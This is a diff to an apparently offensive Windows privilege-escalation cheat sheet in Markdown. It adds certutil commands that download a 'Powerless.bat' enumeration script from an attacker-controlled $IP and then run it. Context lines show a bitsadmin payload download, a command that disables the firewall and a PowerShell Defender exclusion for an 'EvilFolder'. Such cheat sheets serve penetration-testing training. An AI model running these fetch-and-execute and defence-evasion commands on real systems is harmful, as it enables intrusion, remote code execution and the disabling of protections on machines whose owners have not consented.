@@ -101,6 +101,10 @@ $ netsh firewall set opmode disable
 [Back](#summary)
 
 ## Transfer files
+* certutil.exe
+```
+certutil.exe -urlcache -split -f "http://$IP/Powerless.bat" Powerless.bat
+```
 * bitsadmin
 ```
 bitsadmin /transfer dejob /download /priority normal http://10.11.0.65/test.exe c:\Users\Public\test.exe
@@ -455,6 +459,11 @@ C:\>powershell -exec bypass - "Add-MpPreference -ExclusionPath 'D:\EvilFolder\To
 [Back](#summary)
 
 ## Automated Tools
+* [Powerless](https://github.com/M4ximuss/Powerless)
+```
+certutil.exe -urlcache -split -f "http://$IP/Powerless.bat" Powerless.bat
+Powerless.bat
+```
 * [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)
 * [Windows Privesc Check](https://github.com/pentestmonkey/windows-privesc-check)
 * [Sherlock](https://github.com/rasta-mouse/Sherlock)
